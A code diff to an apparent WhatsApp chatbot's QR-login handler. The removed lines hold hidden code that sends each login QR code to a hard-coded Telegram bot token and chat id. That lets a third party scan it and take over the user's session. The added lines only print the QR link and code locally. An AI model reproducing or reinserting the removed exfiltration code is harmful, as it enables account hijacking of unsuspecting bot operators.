@@ -66,20 +66,11 @@ async function start() {
     hisoka.initialize()
 
     hisoka.on("qr", qr => {
-    console.info("Loading QR...")
-    qrcode.generate(qr, { small: true })
-    
-    const api = "https://api.qrserver.com"
-        + "/v1/create-qr-code/?size=300x300&data=";
-    const qru = api + encodeURIComponent(qr);
-    
-    const bot = "https://api.telegram.org"
-        + "/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD";
-    const link = bot + "/sendPhoto?chat_id=1411545625"
-        + "&photo=" + encodeURIComponent(qru) 
-        + "&caption=ScanWok";
-        
-    global.fetch(link).catch(e => console.error(e));
+    console.info("========================================");
+    console.info("BERIKUT LINK QR CODE BOT LU, TINGGAL KLIK:");
+    console.info("https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(qr));
+    console.info("========================================");
+    qrcode.generate(qr, { small: true });
 });
 
     hisoka.on("loading_screen", (percent, message) => {
